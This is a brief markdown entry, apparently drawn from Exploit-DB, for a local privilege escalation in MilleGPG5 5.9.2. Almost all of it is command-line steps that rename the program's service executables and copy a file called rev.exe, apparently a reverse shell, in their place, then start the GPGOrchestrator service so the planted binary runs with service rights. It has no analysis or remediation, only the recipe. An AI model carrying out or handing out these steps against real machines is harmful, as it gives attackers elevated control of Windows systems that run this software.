# MilleGPG5 5.9.2 - Local Privilege Escalation

Reference: https://www.exploit-db.com/exploits/51410

```cmd
c:\Program Files\MilleGPG5>move GPGService.exe GPGService.exe.bak
c:\Program Files\MilleGPG5>move MilleGPG5.exe MilleGPG5.exe.bak

c:\Program Files\MilleGPG5>copy rev.exe MilleGPG5.exe
c:\Program Files\MilleGPG5>copy rev.exe GPGService.exe
        1 file(s) copied.
```

```powershell
PS C:\Program Files\MilleGPG5> sc start GPGOrchestrator
PS C:\Program Files\MilleGPG5> net start GPGOrchestrator
```
